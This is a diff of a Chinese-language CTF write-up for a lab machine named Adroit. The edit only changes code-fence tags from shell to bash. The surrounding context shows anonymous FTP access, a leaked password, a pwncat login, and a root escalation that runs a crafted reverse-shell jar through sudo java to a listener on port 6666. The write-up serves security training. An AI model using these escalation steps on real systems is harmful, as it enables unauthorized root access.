@@ -64,7 +64,7 @@ PORT      STATE SERVICE VERSION
 
 ## ftp 匿名
 
-```shell
+```bash
 ftp> ls -lah
 drwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 .
 drwxr-xr-x    3 ftp      ftp          4096 Jan 14  2021 ..
@@ -202,7 +202,7 @@ password.equals(crypt.encrypt(secret, "god.thunder.olympus"))
 
 然后运行程序
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $ java -jar adroitclient.jar
 Enter the username :
@@ -306,7 +306,7 @@ writer:just.write.my.ideas
 
 ## User - writer
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $ pwncat-cs writer@192.168.56.117
 [23:16:04] Welcome to pwncat 🐈!
@@ -320,7 +320,7 @@ writer
 
 ### flag - user
 
-```shell
+```bash
 (remote) writer@adroit:/home/writer$ cat user.txt
 61de3a25161dcb2b88b5119457690c3c
 ```
@@ -357,7 +357,7 @@ Main-Class: shell
 
 进行编译
 
-```shell
+```bash
 (remote) writer@adroit:/tmp$ javac shell.java
 (remote) writer@adroit:/tmp$ jar cfm Shell.jar Manifest.txt shell.class
 (remote) writer@adroit:/tmp$ mv Shell.jar /tmp/testingmyapp.jar
@@ -365,7 +365,7 @@ Main-Class: shell
 
 ## User - root
 
-```shell
+```bash
 # (remote) writer@adroit:/tmp$ sudo /usr/bin/java -jar /tmp/testingmyapp.jar
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 6666
@@ -379,7 +379,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 (remote) root@adroit:/root# cat root.txt
 017a030885f25af277dd891d0f151845
 ```
